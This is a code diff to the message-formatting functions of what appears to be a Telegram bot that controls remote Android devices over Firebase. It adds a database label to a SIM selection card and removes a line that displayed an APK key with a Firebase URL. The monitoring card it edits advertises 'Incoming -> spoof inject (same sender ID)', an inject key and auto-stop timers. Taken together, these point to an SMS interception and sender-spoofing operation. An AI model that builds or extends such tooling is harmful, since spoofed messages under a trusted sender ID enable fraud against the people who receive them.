@@ -416,7 +416,11 @@ def sim_monitoring_keyboard(device: Device) -> InlineKeyboardMarkup:
     )
 
 
-def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
+def format_sim_selected_card(
+    device: Device,
+    sim_index: int = 0,
+    profile: MonitorProfile | None = None,
+) -> str:
     active = get_selected_sim(device, sim_index)
     slot = active.get("slot", 1)
     return (
@@ -425,7 +429,8 @@ def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
         f"📱 {short_device_id(device.name)}\n"
         f"📡 Device: {format_device_online(device)}\n"
         f"✅ SIM {slot} selected\n"
-        f"🔋 {get_battery(device)}\n\n"
+        f"🔋 {get_battery(device)}\n"
+        f"🗄️ DB: {_db_label(device, profile)}\n\n"
         "Tap START Monitoring or STOP:"
         "</pre>"
     )
@@ -550,7 +555,6 @@ def format_monitoring_card(
     test_message: str | None = None,
     *,
     startup_test_sent: bool = False,
-    firebase_url: str | None = None,
 ) -> str:
     sim_index = profile.selected_sim_index or 0
     active_sim = get_selected_sim(device, sim_index)
@@ -559,10 +563,6 @@ def format_monitoring_card(
     inject_key = get_inject_key(profile, device)
     test_msg = test_message or STARTUP_TEST_MESSAGE
     test_line = f"✅ Test inject OK: {test_msg}" if startup_test_sent else "⏳ Test inject queued..."
-    apk_setup = ""
-    if inject_key and firebase_url:
-        apk_setup = f"📲 APK KEY field: {inject_key}|{firebase_url.rstrip('/')}\n"
-
     channel = profile.channel_id or "—"
     return (
         "✅ <b>SUCCESS</b>\n"
@@ -572,7 +572,6 @@ def format_monitoring_card(
         f"📡 Device: {format_device_online(device)} (Firebase live)\n"
         f"📶 FROM SIM: {sim_slot}\n"
         f"🔑 Inject Key: {inject_key}\n"
-        f"{apk_setup}"
         "📥 Incoming -&gt; spoof inject (same sender ID)\n"
         f"📢 Channel: {channel} (last / addchannel only)\n"
         f"⏱️ Auto-stop in {auto_stop} minutes\n"
